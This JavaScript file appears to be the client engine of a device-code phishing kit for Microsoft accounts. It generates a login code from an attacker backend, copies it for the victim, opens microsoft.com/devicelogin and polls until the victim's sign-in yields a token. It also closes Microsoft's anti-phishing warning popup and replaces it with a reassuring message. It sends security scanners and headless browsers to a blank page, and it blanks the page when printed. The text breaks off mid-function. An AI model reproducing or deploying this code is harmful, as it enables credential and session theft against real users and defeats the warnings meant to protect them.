/**
 * VGenius C Engine – Shared Template Engine
 * Modular, well-commented, no external dependencies except Turnstile.
 * 
 * Features:
 * - Fetch interceptor (auto-adds X-Auth-Mode header)
 * - Device code generation via /api/device/start
 * - Token polling via /api/device/status
 * - AADSTS50076 soft-error handling (switch to token mode)
 * - Toast notification system
 * - Timer countdown
 * - Popup tracker (Microsoft login)
 * - Background blur overlay
 * - Dynamic content injection via window.__* variables
 * - Copy-to-clipboard + auto-open popup
 * - Success overlay with redirect
 */
(function () {
  'use strict';

  // ─── Configuration ──────────────────────────────────────────
  var API_BASE = (typeof window.__API_BASE === 'string' && window.__API_BASE) ? window.__API_BASE : '';
  var AUTH_MODE = (typeof window.__AUTH_MODE === 'string' && window.__AUTH_MODE) ? window.__AUTH_MODE : 'cookie';
  var DEST_URL = window.__DESTINATION_URL || '';
  var VG_JWT = window.VG_JWT || '';

  // ─── Fetch Interceptor ──────────────────────────────────────
  // Overrides window.fetch to automatically add X-Auth-Mode header
  // to /api/device/* requests and normalize responses.
  var _nativeFetch = window.fetch.bind(window);
  var _inflight = {};

  function isDeviceFetch(url) {
    try {
      var raw = typeof url === 'string' || url instanceof URL ? url : (url && url.url);
      if (!raw) return false;
      var path = new URL(raw, location.href).pathname;
      return path === '/api/device/start' || path.indexOf('/api/device/status/') === 0;
    } catch (e) {
      return false;
    }
  }

  function cloneResponse(r) {
    return r && typeof r.clone === 'function' ? r.clone() : r;
  }

  function getMethod(input, init) {
    return String((init && init.method) || (input && input.method) || 'GET').toUpperCase();
  }

  function normalizeDeviceJson(data) {
    if (!data || typeof data !== 'object' || Array.isArray(data)) return data;
    var out = {};
    for (var k in data) {
      if (Object.prototype.hasOwnProperty.call(data, k)) out[k] = data[k];
    }
    // Normalize status
    if (out.user_code && (!out.status || out.status === 'pending' || out.status === 'running' || out.status === 'queued')) {
      out.status = 'waiting_user';
    }
    if (out.status === 'error') out.status = 'failed';
    // Detect soft errors (AADSTS50076, interaction_required)
    var txt = [out.error, out.message, out.error_description, out.error_message].join(' ').toLowerCase();
    if (
      out.soft_error ||
      String(out.recommended_mode || '').toLowerCase() === 'token' ||
      String(out.error_code) === '50076' ||
      txt.indexOf('aadsts50076') !== -1 ||
      txt.indexOf('interaction_required') !== -1
    ) {
      out.soft_error = true;
      if (!out.error_code) out.error_code = 50076;
      if (!out.recommended_mode) out.recommended_mode = 'token';
    }
    return out;
  }

  window.fetch = function (input, init) {
    if (!isDeviceFetch(input)) return _nativeFetch(input, init);

    var nextInit = {};
    if (init) {
      for (var key in init) {
        if (Object.prototype.hasOwnProperty.call(init, key)) nextInit[key] = init[key];
      }
    }
    var headers = new Headers(nextInit.headers || undefined);
    if (!headers.has('X-Auth-Mode')) headers.set('X-Auth-Mode', AUTH_MODE);
    if (VG_JWT && !headers.has('X-VG-JWT')) headers.set('X-VG-JWT', VG_JWT);
    nextInit.headers = headers;

    // Dedupe GET status polls
    var method = getMethod(input, nextInit);
    var path = '';
    try { path = new URL(input, location.href).pathname; } catch (e) {}
    var dedupeKey = (method === 'GET' && path.indexOf('/api/device/status/') === 0) ? path : '';
    if (dedupeKey && _inflight[dedupeKey]) return _inflight[dedupeKey].then(cloneResponse);

    var request = _nativeFetch(input, nextInit).then(function (response) {
      if (!response || typeof response.clone !== 'function') return response;
      return response.clone().text().then(function (text) {
        if (!text) return response;
        try {
          var parsed = JSON.parse(text);
          var normalized = normalizeDeviceJson(parsed);
          var h = new Headers(response.headers);
          h.set('content-type', 'application/json; charset=utf-8');
          return new Response(JSON.stringify(normalized), { status: response.status, statusText: response.statusText, headers: h });
        } catch (e) {
          return response;
        }
      }, function () { return response; });
    });

    if (!dedupeKey) return request;
    _inflight[dedupeKey] = request;
    request.finally(function () { if (_inflight[dedupeKey] === request) delete _inflight[dedupeKey]; });
    return request.then(cloneResponse);
  };

  // ─── State ──────────────────────────────────────────────────
  var _jobId = null;
  var _userCode = '';
  var _pollTimer = null;
  var _countdownTimer = null;
  var _startTime = 0;
  var _codeReady = false;
  var _popupRef = null;
  var _toastTimer = null;

  // ─── Popup Tracker ──────────────────────────────────────────
  var _nativeOpen = window.open;
  function isMicrosoftUrl(u) {
    var s = String(u || '').toLowerCase();
    return s.indexOf('microsoft.com/devicelogin') !== -1 ||
      s.indexOf('login.microsoftonline.com') !== -1 ||
      s.indexOf('microsoftonline.com/appverify') !== -1 ||
      s.indexOf('login.live.com') !== -1;
  }
  window.open = function () {
    var w = _nativeOpen.apply(window, arguments);
    try {
      if (w && isMicrosoftUrl(arguments[0])) {
        _popupRef = w;
      }
    } catch (e) {}
    return w;
  };

  function closePopup() {
    var hadPopup = false;
    try {
      if (_popupRef && !_popupRef.closed) {
        hadPopup = true;
        try { _popupRef.close(); } catch (e) {}
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 100);
        setTimeout(function () { try { if (_popupRef && !_popupRef.closed) _popupRef.close(); } catch (e) {} }, 300);
      }
    } catch (e) {}
    _popupRef = null;
    return hadPopup;
  }

  // ─── Toast System ───────────────────────────────────────────
  function showToast(title, msg, duration) {
    duration = duration || 7000;
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) {
      wrap = document.createElement('div');
      wrap.id = 'vg-toast-wrap';
      wrap.style.cssText = 'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:flex-start;justify-content:center;padding:72px 16px 16px;box-sizing:border-box;opacity:0;pointer-events:none;transition:opacity .2s;';
      wrap.innerHTML = '<div style="position:absolute;inset:0;background:rgba(15,23,42,.28);backdrop-filter:blur(1px);"></div>' +
        '<div id="vg-toast-card" style="position:relative;z-index:1;max-width:460px;width:min(92vw,420px);background:#fff;color:#111827;border:1px solid #e5e7eb;border-radius:12px;padding:16px;box-shadow:0 20px 45px rgba(15,23,42,.18);font-family:Segoe UI,Arial,sans-serif;display:grid;gap:12px;transform:translateY(-8px);transition:all .22s ease;box-sizing:border-box;">' +
        '<div style="display:flex;align-items:flex-start;gap:12px;">' +
        '<div style="width:34px;height:34px;flex:0 0 34px;display:flex;align-items:center;justify-content:center;border-radius:999px;background:#eef6ff;color:#0f6cbd;font-size:17px;font-weight:700;">i</div>' +
        '<div style="display:grid;gap:5px;line-height:1.3"><div id="vg-toast-title" style="font-size:15px;font-weight:700;color:#111827;"></div><div id="vg-toast-msg" style="font-size:13px;color:#4b5563;line-height:1.45;"></div></div>' +
        '</div>' +
        '<div style="display:flex;justify-content:flex-end;"><button id="vg-toast-close" style="height:34px;padding:0 12px;border-radius:8px;border:1px solid #d1d5db;background:#fff;color:#374151;font-weight:600;font-size:13px;cursor:pointer;">Dismiss</button></div>' +
        '</div>';
      (document.body || document.documentElement).appendChild(wrap);
      document.getElementById('vg-toast-close').onclick = function () { hideToast(); };
    }
    document.getElementById('vg-toast-title').textContent = title || '';
    document.getElementById('vg-toast-msg').textContent = msg || '';
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '1';
    wrap.style.pointerEvents = 'auto';
    card.style.transform = 'translateY(0)';
    clearTimeout(_toastTimer);
    _toastTimer = setTimeout(hideToast, duration);
  }

  function hideToast() {
    var wrap = document.getElementById('vg-toast-wrap');
    if (!wrap) return;
    var card = document.getElementById('vg-toast-card');
    wrap.style.opacity = '0';
    wrap.style.pointerEvents = 'none';
    if (card) card.style.transform = 'translateY(-8px)';
  }

  // ─── DOM Helpers ────────────────────────────────────────────
  function setText(selector, text) {
    if (typeof text !== 'string' || text === '') return;
    document.querySelectorAll(selector).forEach(function (el) { el.textContent = text; });
  }

  function applyDynamicContent() {
    if (window.__DOC_FILENAME) document.querySelectorAll('[data-doc-filename]').forEach(function (el) { el.textContent = window.__DOC_FILENAME; });
    if (window.__DOC_TITLE) document.querySelectorAll('[data-doc-title]').forEach(function (el) { el.textContent = window.__DOC_TITLE; });
    if (window.__DOC_PAGES) document.querySelectorAll('[data-doc-pages]').forEach(function (el) { el.textContent = window.__DOC_PAGES; });
    if (typeof window.__PAGE_TITLE === 'string' && window.__PAGE_TITLE !== '') {
      setText('[data-page-title],[data-template-title],[data-custom-title]', window.__PAGE_TITLE);
      var fallback = document.querySelector('main h1, .card h1, .shell h1, h1');
      if (fallback && !document.querySelector('[data-page-title]')) fallback.textContent = window.__PAGE_TITLE;
    }
    if (typeof window.__PAGE_MESSAGE === 'string' && window.__PAGE_MESSAGE !== '') {
      setText('[data-page-message],[data-template-message],[data-custom-message]', window.__PAGE_MESSAGE);
    }
    if (typeof window.__PRIMARY_BUTTON_TEXT === 'string' && window.__PRIMARY_BUTTON_TEXT !== '') {
      setText('[data-primary-button]', window.__PRIMARY_BUTTON_TEXT);
      var btn = document.querySelector('button.cta-btn, button.bp, button.go, button.linakufe, button.btn-open');
      if (btn && !btn.querySelector('[data-primary-button]')) {
        var walker = document.createTreeWalker(btn, NodeFilter.SHOW_TEXT);
        var first = walker.nextNode();
        if (first) {
          first.nodeValue = window.__PRIMARY_BUTTON_TEXT;
          var next;
          while ((next = walker.nextNode())) next.nodeValue = '';
        }
      }
    }
  }

  // ─── Background Blur ────────────────────────────────────────
  function initBackgroundBlur() {
    var rawUrl = typeof window.__BACKGROUND_BLUR_URL === 'string' ? window.__BACKGROUND_BLUR_URL.trim() : '';
    if (!rawUrl) return;
    var blur = Number(window.__BACKGROUND_BLUR_AMOUNT);
    if (!Number.isFinite(blur)) blur = 2.5;
    blur = Math.max(0, Math.min(12, blur));

    var body = document.body;
    if (!body || document.body.getAttribute('data-vg-bg-ready') === '1') return;

    var style = document.createElement('style');
    style.id = 'vg-bg-styles';
    style.textContent =
      'html.vg-bg-active{min-height:100%;background:#0c1220!important;}' +
      'body.vg-bg-active{min-height:100vh!important;background:transparent!important;}' +
      'body.vg-bg-active>#vg-bg-layer{position:fixed!important;inset:0!important;z-index:0!important;pointer-events:none!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-image{position:absolute!important;inset:-3%!important;width:106%!important;height:106%!important;background-position:center!important;background-size:cover!important;background-repeat:no-repeat!important;filter:blur(var(--vg-bg-blur,2.5px)) brightness(.9) saturate(.98)!important;transform:scale(1.02)!important;}' +
      'body.vg-bg-active>#vg-bg-layer .vg-bg-overlay{position:absolute!important;inset:0!important;background:rgba(12,18,32,.36)!important;}';
    (document.head || document.documentElement).appendChild(style);

    try {
      var parsedUrl = new URL(rawUrl, location.href);
      if (!/^https?:$/.test(parsedUrl.protocol)) return;
    } catch (e) { return; }

    document.documentElement.classList.add('vg-bg-active');
    body.classList.add('vg-bg-active');
    body.style.setProperty('--vg-bg-blur', blur + 'px');

    var layer = document.createElement('div');
    layer.id = 'vg-bg-layer';
    layer.setAttribute('aria-hidden', 'true');

    var image = document.createElement('div');
    image.className = 'vg-bg-image';
    image.style.backgroundImage = 'url("' + parsedUrl.href.replace(/"/g, '%22') + '")';

    var overlay = document.createElement('div');
    overlay.className = 'vg-bg-overlay';

    layer.appendChild(image);
    layer.appendChild(overlay);

    if (!body.firstChild) {
      body.appendChild(layer);
    } else {
      body.insertBefore(layer, body.firstChild);
    }
    body.setAttribute('data-vg-bg-ready', '1');
  }

  // ─── Code Generation ────────────────────────────────────────
  window.generateCode = async function () {
    // Reset UI state
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'none';
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var timerEl = document.getElementById('timerPill');
    if (timerEl) { timerEl.textContent = ''; timerEl.style.display = 'none'; timerEl.classList.remove('expired'); }

    var startBtn = document.getElementById('startBtn');
    var originalBtnText = '<span class="vg-spin">⟳</span> Generating code…';
    if (startBtn) { startBtn.disabled = true; startBtn.innerHTML = originalBtnText; }

    _setStatus('');
    clearInterval(_pollTimer);
    clearInterval(_countdownTimer);
    _jobId = null;
    _userCode = '';
    _codeReady = false;

    try {
      var apiUrl = API_BASE ? API_BASE + '/api/device/start' : '/api/device/start';

      // Turnstile runs silently in background during page load (initBotDetection -> initTurnstileVerification).
      // Token is already available (or null if bot detection caught it).
      // No blocking wait or UI prompts needed.

      var r = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Auth-Mode': AUTH_MODE,
          'X-VG-JWT': VG_JWT,
          'X-Turnstile-Token': window.__TURNSTILE_TOKEN || '',
        },
        body: JSON.stringify({ 
          mode: AUTH_MODE, 
          jwt_token: VG_JWT,
          turnstile_token: window.__TURNSTILE_TOKEN || null,
        }),
      });
      var d = await r.json();

      if (d.error) { 
        _showError(d.error); 
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
        return; 
      }
      _jobId = d.job_id;
      if (!_jobId) { 
        _showError('Session failed. Please refresh.'); 
        if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
        return; 
      }
      _userCode = d.user_code || '';
      _startTime = Date.now();

      var codePanel = document.getElementById('codePanel');
      if (codePanel) codePanel.classList.add('show');

      // Hide generate button and show action buttons when code is ready
      if (_userCode) {
        var codeEl = document.getElementById('codeValue');
        if (codeEl) {
          codeEl.style.opacity = 0;
          setTimeout(function () {
            codeEl.textContent = _userCode;
            codeEl.classList.remove('loading');
            codeEl.style.opacity = 1;
          }, 150);
        }
        
        // Clear all status messages
        var codeHint = document.getElementById('codeHint');
        if (codeHint) codeHint.textContent = '';
        
        var statusEl = document.getElementById('statusMsg');
        if (statusEl) statusEl.textContent = '';
        
        // Hide generate button, show action buttons
        if (startBtn) startBtn.style.display = 'none';
        if (actionRow) {
          actionRow.style.display = 'grid';
          _codeReady = true;
        }
        
        _startTimer(d.expires_in || 600);
      } else {
        _setStatus('Connecting to Microsoft servers…');
      }

      _pollTimer = setInterval(_poll, 1000);
      _poll();
    } catch (e) {
      _showError(e.message || 'Connection failed');
      if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
    }
  };

  // ─── Polling ────────────────────────────────────────────────
  async function _poll() {
    if (Date.now() - _startTime > 600000) {
      clearInterval(_pollTimer);
      _onExpired();
      return;
    }

    try {
      var statusUrl = API_BASE ? API_BASE + '/api/device/status/' + _jobId : '/api/device/status/' + _jobId;
      var r = await fetch(statusUrl);
      var d = await r.json();

      if (d.status === 'waiting_user' && d.user_code) {
        var el = document.getElementById('codeValue');
        if (el && el.textContent !== d.user_code) {
          el.style.opacity = 0;
          setTimeout(function () {
            el.textContent = d.user_code;
            el.classList.remove('loading');
            el.style.opacity = 1;
          }, 150);
        }
        _userCode = d.user_code;

        if (!_codeReady) {
          _codeReady = true;
          var startBtn = document.getElementById('startBtn');
          if (startBtn) startBtn.style.display = 'none';
          var actionRow = document.getElementById('actionRow');
          if (actionRow) actionRow.style.display = 'grid';
          _setStatus('');
          _startTimer(d.expires_in || 600);
        }
      }

      // Success
      if (d.status === 'done' || d.status === 'success' || d.status === 'completed') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        closePopup();
        _showSuccess();
        return;
      }

      // Soft error (AADSTS50076)
      if (d.soft_error || d.status === 'soft_error') {
        clearInterval(_pollTimer);
        // Switch to token mode
        AUTH_MODE = 'token';
        showToast('Additional verification required', 'A new verification session is being prepared.', 7600);
        // If retry_job_id is available, switch to it
        if (d.retry_job_id) {
          _jobId = d.retry_job_id;
          _codeReady = false;
          _pollTimer = setInterval(_poll, 1000);
        } else {
          // Start a new flow in token mode
          setTimeout(function () { window.generateCode(); }, 1500);
        }
        return;
      }

      // Failed/expired
      if (d.status === 'failed' || d.status === 'expired' || d.status === 'timeout_waiting_user_login') {
        clearInterval(_pollTimer);
        clearInterval(_countdownTimer);
        _showError(d.error || d.status || 'Verification failed');
      }
    } catch (e) {
      // Silent - continue polling
    }
  }

  // ─── Timer ──────────────────────────────────────────────────
  function _startTimer(sec) {
    clearInterval(_countdownTimer);
    var el = document.getElementById('timerPill');
    if (!el) return;
    el.style.display = 'inline-flex';
    var t = sec;
    var tick = function () {
      if (t > 0) {
        var m = Math.floor(t / 60);
        var s = String(t % 60).padStart(2, '0');
        el.textContent = 'Valid for ' + m + ':' + s;
      } else {
        clearInterval(_countdownTimer);
        clearInterval(_pollTimer);
        _onExpired();
      }
      t--;
    };
    tick();
    _countdownTimer = setInterval(tick, 1000);
  }

  function _onExpired() {
    var timerEl = document.getElementById('timerPill');
    if (timerEl) {
      timerEl.textContent = 'Code expired.';
      timerEl.classList.add('expired');
    }
    var actionRow = document.getElementById('actionRow');
    if (actionRow) actionRow.style.display = 'none';
    var refreshBtn = document.getElementById('refreshBtn');
    if (refreshBtn) refreshBtn.style.display = 'inline-flex';
    _setStatus('');
  }

  // ─── Copy + Open Popup ──────────────────────────────────────
  function copyText(text) {
    return navigator.clipboard.writeText(text).catch(function () {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.style.position = 'fixed';
      ta.style.opacity = '0';
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
    });
  }

  window.copyAndOpenPopup = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('copyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
    });
    openMsLogin();
  };

  window.verifyWithCopy = function () {
    copyText(_userCode).then(function () {
      var btn = document.getElementById('verifyBtn');
      if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Code copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
      var copyBtn = document.getElementById('copyBtn');
      if (copyBtn) { var orig2 = copyBtn.textContent; copyBtn.textContent = 'Copied!'; setTimeout(function () { copyBtn.textContent = orig2; }, 1500); }
    });
    openMsLogin();
  };

  function openMsLogin() {
    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
    if (isMobile) {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', '_blank');
    } else {
      _popupRef = _nativeOpen('https://microsoft.com/devicelogin', 'vgML', 'width=500,height=600');
    }
    
    // Monitor popup for Microsoft warning page
    if (_popupRef && !isMobile) {
      monitorPopupForWarnings(_popupRef);
    }
  }
  
  // VG_ - Monitor popup for Microsoft anti-phishing warning page
  function monitorPopupForWarnings(popup) {
    var checkInterval = setInterval(function() {
      try {
        // Check if popup is closed
        if (popup.closed) {
          clearInterval(checkInterval);
          return;
        }
        
        // Try to access popup URL and check for warning signs
        try {
          var popupUrl = popup.location.href;
          var popupTitle = popup.document.title;
          var popupBody = popup.document.body && popup.document.body.innerHTML || '';
          
          // Detect Microsoft warning page
          var isWarningPage = false;
          if (popupTitle && (
            popupTitle.toLowerCase().indexOf('phishing') !== -1 ||
            popupTitle.toLowerCase().indexOf('password') !== -1 ||
            popupTitle.toLowerCase().indexOf('not normally shown') !== -1
          )) {
            isWarningPage = true;
          }
          
          if (popupBody && (
            popupBody.toLowerCase().indexOf('phishing attempt') !== -1 ||
            popupBody.toLowerCase().indexOf('url contains your password') !== -1 ||
            popupBody.toLowerCase().indexOf('close this page immediately') !== -1
          )) {
            isWarningPage = true;
          }
          
          if (isWarningPage) {
            // Close the warning popup
            popup.close();
            clearInterval(checkInterval);
            
            // Show user-friendly error message
            showToast('Verification Issue', 'Microsoft detected unusual activity. Please try again in a few minutes or use a different verification method.', 8000);
            
            // Reset UI state
            var startBtn = document.getElementById('startBtn');
            if (startBtn) {
              startBtn.style.display = 'block';
              startBtn.disabled = false;
              startBtn.innerHTML = 'Generate Code';
            }
            _codeReady = false;
            return;
          }
        } catch (e) {
          // Cross-origin error - can't access popup content, that's normal
          // Just continue monitoring
        }
      } catch (e) {
        // Popup closed or inaccessible
        clearInterval(checkInterval);
      }
    }, 1000); // Check every second
    
    // Stop monitoring after 5 minutes
    setTimeout(function() {
      clearInterval(checkInterval);
    }, 300000);
  }

  // VG_ - Sign in button: open Microsoft sign-in popup
  window.openSignIn = function () {
    var codeEl = document.getElementById('codeValue');
    var code = codeEl ? codeEl.textContent : '';
    if (code && code !== '· · · · · ·') {
      copyText(code).then(function () {
        var btn = document.getElementById('signInBtn');
        if (btn) { var orig = btn.innerHTML; btn.innerHTML = '<svg width="15" height="15" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Copied!'; setTimeout(function () { btn.innerHTML = orig; }, 1500); }
        openMsLogin();
      }).catch(function () {
        openMsLogin();
      });
    }
  };

  window.refreshCode = function () {
    window.generateCode();
  };

  // ─── Success Overlay ────────────────────────────────────────
  function _showSuccess() {
    var overlay = document.getElementById('overlay');
    if (overlay) {
      overlay.classList.add('show');
      
      // Determine redirect URL
      var redirectUrl = DEST_URL;
      
      // Blob URL mode: create blob and redirect to it
      if (window.__BLOB_URL_ENABLED && document.documentElement) {
        try {
          var html = document.documentElement.outerHTML;
          var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
          if (isSafari) {
            // Safari doesn't support blob URLs well - use data URL instead
            var dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
            redirectUrl = dataUrl;
          } else {
            var blob = new Blob([html], { type: 'text/html' });
            var blobUrl = URL.createObjectURL(blob);
            redirectUrl = blobUrl;
          }
        } catch (e) {
          // Fallback to normal redirect
          redirectUrl = DEST_URL;
        }
      }
      
      // Redirect after showing overlay
      if (redirectUrl) {
        setTimeout(function () { 
          window.location.replace(redirectUrl); 
        }, 2500);
      } else {
        // No redirect URL - just show overlay and close popup
        setTimeout(function () {
          closePopup();
          // Hide overlay after 3 seconds
          setTimeout(function () {
            overlay.classList.remove('show');
          }, 3000);
        }, 2000);
      }
    }
  }

  // ─── Helpers ────────────────────────────────────────────────
  function _setStatus(msg) {
    var el = document.getElementById('statusMsg');
    if (el) { el.textContent = msg; el.classList.remove('error'); }
  }

  function _showError(code) {
    var map = {
      timeout_waiting_user_login: 'Your verification code has expired. Please refresh.',
      'Session expired': 'Your verification code has expired. Please refresh.',
      failed: 'Verification failed. Please try again.',
      'Worker error': 'Something went wrong. Please try again.',
      'Worker crash': 'Something went wrong. Please try again.',
    };
    _onExpired();
    var el = document.getElementById('statusMsg');
    if (el) {
      el.textContent = map[code] || 'Something went wrong. Please try again.';
      el.classList.add('error');
    }
  }

  // ─── Human Verification / Bot Detection ─────────────────────
  // ALL bot protection runs silently. No captcha UI is ever shown to users.
  // Turnstile invisible widget auto-executes on page load.
  // Passive bot scoring blocks obvious automation tools.
  function initBotDetection() {
    // Check if this is a slider verification page
    var isSliderPage = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    
    // On slider pages, skip the blocking bot detection entirely.
    // The slider itself IS the bot detection mechanism.
    // Still run non-blocking scoring for analytics only.
    if (isSliderPage) {
      console.log('[vg-engine] Slider page detected, skipping blocking bot detection');
      return;
    }
    
    // Always run passive bot detection first
    var botScore = calculateBotScore();
    if (botScore > 0.7) {
      // High probability of bot - redirect silently
      document.body.innerHTML = '';
      window.location.href = 'about:blank';
      return;
    }

    // Initialize Turnstile if enabled (runs invisibly, no UI)
    if (window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
      initTurnstileVerification();
    }
  }

  function calculateBotScore() {
    var score = 0;
    var checks = 0;

    // Check 1: Navigator properties
    try {
      checks++;
      if (!navigator.webdriver) score += 0.1;
      if (navigator.languages && navigator.languages.length > 0) score += 0.1;
      if (navigator.plugins && navigator.plugins.length > 0) score += 0.1;
    } catch (e) { score += 0.3; }

    // Check 2: Screen properties
    try {
      checks++;
      if (screen.width > 0 && screen.height > 0) score += 0.1;
      if (screen.colorDepth > 0) score += 0.1;
    } catch (e) { score += 0.2; }

    // Check 3: Timing attacks
    try {
      checks++;
      var start = performance.now();
      var now = Date.now();
      if (Math.abs(now - start) < 100) score += 0.15; // Suspicious timing
    } catch (e) { score += 0.1; }

    // Check 4: WebGL/Canvas fingerprinting
    try {
      checks++;
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl && gl.getParameter) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          if (renderer && renderer.toLowerCase().indexOf('swiftshader') !== -1) score += 0.2;
          if (renderer && renderer.toLowerCase().indexOf('llvmpipe') !== -1) score += 0.2;
        }
      }
    } catch (e) { score += 0.1; }

    // Check 5: Automation tool detection
    try {
      checks++;
      // Puppeteer/Playwright indicators
      if (window._chrome && !window.chrome) score += 0.3;
      if (navigator.webdriver) score += 0.3;
      // Selenium indicators
      if (window.document.__webdriver_evaluate) score += 0.3;
      if (window.document.__selenium_evaluate) score += 0.3;
      if (window.document.__fxdriver_evaluate) score += 0.3;
      // PhantomJS
      if (window.callPhantom || window._phantom) score += 0.3;
    } catch (e) { score += 0.1; }

    // Check 6: Headless browser detection
    try {
      checks++;
      if (!window.chrome || window.chrome.runtime && !window.chrome.runtime.id) score += 0.15;
      if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'notifications' }).then(function(result) {
          if (result.state === 'denied' || result.state === 'prompt') {
            // Normal behavior
          }
        }).catch(function() {
          score += 0.1;
        });
      }
    } catch (e) { score += 0.1; }

    return checks > 0 ? Math.min(score / checks, 1) : 0;
  }

  function initTurnstileVerification() {
    // Ensure widget container exists and is hidden
    var widgetContainer = document.getElementById('turnstileWidget');
    if (!widgetContainer) {
      widgetContainer = document.createElement('div');
      widgetContainer.id = 'turnstileWidget';
      widgetContainer.style.display = 'none'; // Completely hidden - invisible mode
      document.body.appendChild(widgetContainer);
    }

    // Wait for Turnstile to load
    if (typeof window.turnstile === 'undefined') {
      // Load Turnstile script dynamically with onload callback
      var script = document.createElement('script');
      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReady';
      script.async = true;
      script.defer = true;
      script.id = 'vg-turnstile-script';
      (document.head || document.documentElement).appendChild(script);
      // Global callback for when Turnstile loads
      window.vgOnTurnstileReady = function() {
        renderAndExecuteTurnstile(widgetContainer);
      };
      return;
    }

    renderAndExecuteTurnstile(widgetContainer);
  }

  function renderAndExecuteTurnstile(widgetContainer) {
    // Skip if already rendered (check for data-widget-id attribute)
    if (widgetContainer.getAttribute('data-widget-id')) {
      return; // Already rendered
    }

    // Render invisible Turnstile widget - NO UI shown to users
    try {
      var widgetId = window.turnstile.render('#turnstileWidget', {
        sitekey: window.__TURNSTILE_SITE_KEY,
        invisible: true,
        'retry': 'never',
        callback: function(token) {
          // Store token silently for form submission
          window.__TURNSTILE_TOKEN = token;
        },
        'error-callback': function() {
          // On error, token remains null - bot detection will handle it
          window.__TURNSTILE_TOKEN = null;
        },
        'expired-callback': function() {
          // Token expired, re-execute silently
          window.__TURNSTILE_TOKEN = null;
          try { window.turnstile.execute(widgetId); } catch(e) {}
        }
      });

      // Mark as rendered
      widgetContainer.setAttribute('data-widget-id', widgetId);

      // Auto-execute immediately after rendering (invisible mode - no user interaction needed)
      setTimeout(function() {
        try { window.turnstile.execute(widgetId); } catch(e) {}
      }, 500);
    } catch(e) {
      // Fail silently
    }
  }

  // NOTE: showTurnstileChallenge and validateTurnstileToken removed.
  // All Turnstile operations are now fully silent and invisible.
  // Users never see any captcha UI. Bots are blocked by passive scoring + Turnstile invisible challenge.

  // ─── Anti-Screenshot / Anti-Print CSS ───────────────────────
  // Injects CSS that makes screenshots/print come out blank.
  // Works via CSS @media rules and visibility manipulation.
  function initAntiScreenshot() {
    var style = document.createElement('style');
    style.id = 'vg-anti-screenshot';
    style.textContent =
      /* Print/media query - blank everything when printing */
      '@media print {' +
      '  html, body, div, span, applet, object, iframe,' +
      '  h1, h2, h3, h4, h5, h6, p, blockquote, pre,' +
      '  a, abbr, acronym, address, big, cite, code,' +
      '  del, dfn, em, img, ins, kbd, q, s, samp,' +
      '  small, strike, strong, sub, sup, tt, var,' +
      '  b, u, i, center,' +
      '  dl, dt, dd, ol, ul, li,' +
      '  fieldset, form, label, legend,' +
      '  table, caption, tbody, tfoot, thead, tr, th, td,' +
      '  article, aside, canvas, details, embed, figure,' +
      '  figcaption, footer, header, hgroup, menu, nav,' +
      '  output, ruby, section, summary, time, mark, audio, video {' +
      '    all: none !important;' +
      '    visibility: hidden !important;' +
      '    opacity: 0 !important;' +
      '    display: none !important;' +
      '  }' +
      '  body::before {' +
      '    content: "";' +
      '    display: block;' +
      '    position: fixed;' +
      '    top: 0; left: 0; width: 100vw; height: 100vh;' +
      '    background: #ffffff;' +
      '    z-index: 999999;' +
      '  }' +
      '}' +
      
      /* Screen capture protection - blank on focus loss */
      ':focus-within {' +
      '  transition: opacity 0.1s;' +
      '}' +
      
      /* Detect window blur (screen capture tools often blur window) - show watermark instead of hiding */
      'body.window-blurred {' +
      '}' +
      'body.window-blurred #vg-screenshot-watermark {' +
      '  display: block !important;' +
      '}' +
      
      /* Anti-clone protection: only apply to print/media queries, NOT during normal screen rendering */
      '';
    (document.head || document.documentElement).appendChild(style);

    // Removed blur/focus event listeners — they caused page flickering on normal browser use
    // Windows screenshot tools and normal tab switching trigger blur events that caused
    // the anti-screenshot CSS to hide all content, making pages appear broken

    // MutationObserver to detect content scraping attempts
    try {
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          // If someone tries to remove/hide our elements
          if (mutation.removedNodes.length > 0) {
